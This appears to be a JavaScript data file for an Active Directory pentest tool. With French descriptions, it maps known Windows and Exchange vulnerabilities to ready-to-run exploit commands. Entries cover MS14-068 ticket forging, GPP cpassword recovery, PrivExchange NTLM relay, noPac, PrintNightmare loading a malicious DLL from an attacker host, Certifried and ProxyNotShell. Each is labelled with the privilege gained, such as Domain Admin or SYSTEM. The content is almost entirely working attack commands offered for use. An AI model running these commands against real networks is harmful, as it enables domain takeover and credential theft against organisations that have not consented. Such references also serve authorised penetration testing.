export const KNOWN_VULNS_DATA = [
  {
    name: 'MS14-068 (Kerberos Checksum)',
    nodes: [
      { 
        label: 'GoldenPac (Impacket)', 
        cmd: 'goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@<target_fqdn>', 
        leadsTo: 'Domain Admin',
        description: 'Exploite une vulnérabilité de validation du PAC Kerberos pour forger un TGT avec des privilèges de Domain Admin et obtenir un shell Psexec.'
      },
      { 
        label: 'ms14-068.py Exploit', 
        cmd: 'python2 ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>', 
        leadsTo: 'TGT Ticket',
        description: 'Génère un fichier de ticket TGT forgé (TGT_CCACHE) à injecter ensuite pour devenir Domain Admin.'
      }
    ]
  },
  {
    name: 'GPP Passwords (MS14-025)',
    nodes: [
      { 
        label: 'Get-GPPPassword', 
        cmd: 'Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>', 
        leadsTo: 'Cleartext Creds',
        description: 'Récupère et déchiffre les mots de passe (cpassword) stockés dans les fichiers XML des stratégies de groupe (SYSVOL).'
      },
      { 
        label: 'Find GPP Files', 
        cmd: 'findstr /S /I cpassword \\\\<domain>\\sysvol\\<domain>\\policies\\*.xml', 
        leadsTo: 'Encrypted Creds',
        description: 'Recherche manuelle des attributs "cpassword" dans le partage SYSVOL.'
      }
    ]
  },
  {
    name: 'PrivExchange (CVE-2019-0724)',
    nodes: [
      { 
        label: 'PrivExchange Exploit', 
        cmd: 'privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>', 
        leadsTo: 'Domain Admin',
        description: 'Force Exchange à s\'authentifier sur l\'attaquant via HTTP push subscription, permettant un relais NTLM vers LDAP pour s\'octroyer des droits (DCSync).'
      }
    ]
  },
  {
    name: 'noPac (CVE-2021-42287)',
    nodes: [
      { 
        label: 'NXC noPac Scan', 
        cmd: 'nxc smb <ip_range> -u <user> -p <password> -M nopac', 
        leadsTo: 'Vulnerable Host',
        description: 'Scanne les contrôleurs de domaine pour vérifier s\'ils sont vulnérables à sAMAccountName Spoofing.'
      },
      { 
        label: 'noPac Exploit', 
        cmd: 'noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <fake_pc> /service cifs /ptt', 
        leadsTo: 'Domain Admin',
        description: 'Usurpe l\'identité d\'un DC en manipulant le sAMAccountName lors d\'une demande de TGT, permettant un Pass-The-Ticket en tant que Domain Admin.'
      }
    ]
  },
  {
    name: 'PrintNightmare (CVE-2021-1675)',
    nodes: [
      { 
        label: 'NXC PrintNightmare Scan', 
        cmd: 'nxc smb <ip> -u <user> -p <password> -M printnightmare', 
        leadsTo: 'Vulnerable Host',
        description: 'Vérifie si le service Spooler est actif et si les correctifs sont appliqués.'
      },
      { 
        label: 'PrintNightmare Exploit', 
        cmd: 'printnightmare.py -dll \\\\<attacker_ip>\\share\\malicious.dll <user>:<password>@<target_ip>', 
        leadsTo: 'SYSTEM / Admin',
        description: 'Exploite le service d\'impression pour charger une DLL malveillante distante avec les privilèges SYSTEM.'
      }
    ]
  },
  {
    name: 'Certifried (CVE-2022-26923)',
    nodes: [
      { 
        label: 'Certifried Exploit Chain', 
        cmd: 'certipy req -u <machine_acc> -p <pass> -target <ca_ip> -template Machine -dns <dc_fqdn>', 
        leadsTo: 'Domain Admin',
        description: 'Modifie le dNSHostName d\'un compte machine contrôlé pour correspondre au DC, puis demande un certificat pour usurper l\'identité du DC.'
      }
    ]
  },
  {
    name: 'ProxyNotShell (CVE-2022-41040)',
    nodes: [
      { 
        label: 'ProxyNotShell PoC', 
        cmd: 'python3 poc_proxynotshell.py <exchange_host> <user> <password> <cmd>', 
        leadsTo: 'Admin (Exchange)',
        description: 'Contournement du patch ProxyShell via SSRF permettant l\'exécution de commandes à distance authentifiée.'
      }
    ]
  }
];